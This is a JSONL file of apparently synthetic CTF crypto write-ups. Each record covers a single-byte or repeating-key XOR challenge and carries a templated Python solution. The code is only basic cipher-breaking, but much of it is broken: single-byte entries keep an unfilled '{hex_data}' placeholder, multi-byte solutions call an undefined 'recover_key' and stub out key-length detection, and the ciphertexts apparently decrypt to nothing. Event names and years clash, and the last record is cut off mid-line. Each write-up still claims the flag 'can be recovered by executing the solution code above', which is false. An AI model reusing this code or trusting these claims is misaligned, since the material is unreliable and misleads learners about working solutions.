{"id": "synthetic_xor_068", "team": "synthetic_team_2", "event": "CTF_2024_Event_12", "challenge_name": "Single Byte XOR #69", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/68", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830447", "synthetic": true}
{"id": "synthetic_xor_069", "team": "synthetic_team_5", "event": "CTF_2024_Event_6", "challenge_name": "Multi-byte XOR Key Reuse #70", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"e2d45ee3ccc2871c572a7dd05f62899c025db672f69389b49ddbb078e654dc6e\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"e2d45ee3ccc2871c572a7dd05f62899c025db672f69389b49ddbb078e654dc6e\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/69", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830478", "synthetic": true}
{"id": "synthetic_xor_070", "team": "synthetic_team_8", "event": "CTF_2024_Event_1", "challenge_name": "Single Byte XOR #71", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/70", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830509", "synthetic": true}
{"id": "synthetic_xor_071", "team": "synthetic_team_1", "event": "CTF_2024_Event_9", "challenge_name": "Single Byte XOR #72", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/71", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830539", "synthetic": true}
{"id": "synthetic_xor_072", "team": "synthetic_team_9", "event": "CTF_2024_Event_16", "challenge_name": "Single Byte XOR #73", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/72", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830570", "synthetic": true}
{"id": "synthetic_xor_073", "team": "synthetic_team_4", "event": "CTF_2024_Event_20", "challenge_name": "Single Byte XOR #74", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/73", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830610", "synthetic": true}
{"id": "synthetic_xor_074", "team": "synthetic_team_3", "event": "CTF_2024_Event_13", "challenge_name": "Multi-byte XOR Key Reuse #75", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"f38388c05d61b092dbbb21f17dee924470fa38acf63cf46c3f8234268f6388cc\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"f38388c05d61b092dbbb21f17dee924470fa38acf63cf46c3f8234268f6388cc\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/74", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830641", "synthetic": true}
{"id": "synthetic_xor_075", "team": "synthetic_team_4", "event": "CTF_2024_Event_6", "challenge_name": "Multi-byte XOR Key Reuse #76", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"f458f68a25caed3d1a04afb36ec15142ccc48f2fa65bc94b5a2bf066ef5fe936\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"f458f68a25caed3d1a04afb36ec15142ccc48f2fa65bc94b5a2bf066ef5fe936\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/75", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830672", "synthetic": true}
{"id": "synthetic_xor_076", "team": "synthetic_team_8", "event": "CTF_2024_Event_19", "challenge_name": "Multi-byte XOR Key Reuse #77", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"a6846537ebff336735db960d0337852929d9584823f40aa3acae5ad5f22d306d\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"a6846537ebff336735db960d0337852929d9584823f40aa3acae5ad5f22d306d\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/76", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830702", "synthetic": true}
{"id": "synthetic_xor_077", "team": "synthetic_team_6", "event": "CTF_2024_Event_16", "challenge_name": "Single Byte XOR #78", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/77", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830732", "synthetic": true}
{"id": "synthetic_xor_078", "team": "synthetic_team_7", "event": "CTF_2024_Event_18", "challenge_name": "Single Byte XOR #79", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/78", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830762", "synthetic": true}
{"id": "synthetic_xor_079", "team": "synthetic_team_10", "event": "CTF_2024_Event_15", "challenge_name": "Single Byte XOR #80", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/79", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830793", "synthetic": true}
{"id": "synthetic_xor_080", "team": "synthetic_team_3", "event": "CTF_2024_Event_7", "challenge_name": "Multi-byte XOR Key Reuse #81", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"c5989f6fb229327d4af6667d75a225bb178cb2c287228d6ff91053b335ed93cd\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"c5989f6fb229327d4af6667d75a225bb178cb2c287228d6ff91053b335ed93cd\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/80", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830823", "synthetic": true}
{"id": "synthetic_xor_081", "team": "synthetic_team_8", "event": "CTF_2024_Event_3", "challenge_name": "Single Byte XOR #82", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/81", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830854", "synthetic": true}
{"id": "synthetic_xor_082", "team": "synthetic_team_9", "event": "CTF_2024_Event_5", "challenge_name": "Single Byte XOR #83", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/82", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830888", "synthetic": true}
{"id": "synthetic_xor_083", "team": "synthetic_team_5", "event": "CTF_2024_Event_12", "challenge_name": "Multi-byte XOR Key Reuse #84", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"bcff187ff219de9540f83f309510675fcf715252cadbe76d369f72e063525ab1\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"bcff187ff219de9540f83f309510675fcf715252cadbe76d369f72e063525ab1\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/83", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830918", "synthetic": true}
{"id": "synthetic_xor_084", "team": "synthetic_team_3", "event": "CTF_2024_Event_15", "challenge_name": "Multi-byte XOR Key Reuse #85", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"d348847a733a77585f1237c6217a822a54e7af2486c3b82a6d4247cd374e19ba\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = 